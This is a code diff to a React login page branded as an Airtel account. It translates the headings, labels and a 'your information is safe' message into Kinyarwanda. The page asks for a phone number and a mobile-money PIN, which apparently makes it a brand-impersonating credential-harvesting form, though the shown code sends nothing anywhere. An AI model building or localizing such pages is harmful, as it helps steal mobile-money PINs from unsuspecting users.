@@ -63,18 +63,18 @@ const pinCode = pinDigits.join("");
   return (
     <SharedLayout>
       {/* Welcome Section */}
-      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Welcome back</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-4 sm:mb-6">Log in to Airtel Account</p>
+      <h2 className="text-2xl sm:text-4xl font-black text-black mb-1 sm:mb-2">Murakaza neza nanone!</h2>
+      <p className="text-gray-500 text-sm sm:text-lg mb-4 sm:mb-6">Injira muri konti ya Airtel.</p>
 
       {/* Info Alert */}
       <div className="bg-red-100 border-2 border-red-300 rounded-xl sm:rounded-2xl p-3 sm:p-4 mb-4 sm:mb-6 flex items-start gap-2 sm:gap-3">
         <AlertCircle className="w-5 h-5 sm:w-6 sm:h-6 text-red-600 flex-shrink-0 mt-0.5" />
-        <p className="text-black font-semibold text-sm sm:text-base">Enter Airtel number.</p>
+        <p className="text-black font-semibold text-sm sm:text-base">Andika nimero yawe ya Airtel.</p>
       </div>
 
       {/* Phone Number Field */}
       <div className="mb-4 sm:mb-6">
-        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Phone Number</label>
+        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Nimero ya Telefoni</label>
         <div className="flex gap-0">
           <input
             type="text"
@@ -94,7 +94,7 @@ const pinCode = pinDigits.join("");
 
       {/* MOMO PIN Field */}
       <div className="mb-4 sm:mb-6">
-        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Enter Your Airtel PIN</label>
+        <label className="block text-black font-bold mb-2 sm:mb-3 text-sm sm:text-base">Injiza PIN yawe ya Airtel.</label>
         <div className="flex gap-2 sm:gap-3 justify-center">
           {pinDigits.map((digit, index) => (
             <input
@@ -125,7 +125,7 @@ const pinCode = pinDigits.join("");
       {/* Security Message */}
       <div className="flex items-center justify-center gap-2 text-gray-600 text-center">
         <Shield className="w-4 h-4 sm:w-5 sm:h-5 text-yellow-600 flex-shrink-0" />
-        <p className="text-xs sm:text-sm">Your information is safe and secure</p>
+        <p className="text-xs sm:text-sm">Amakuru yawe ararinzwe kandi atekanye.</p>
       </div>
     </SharedLayout>
   );
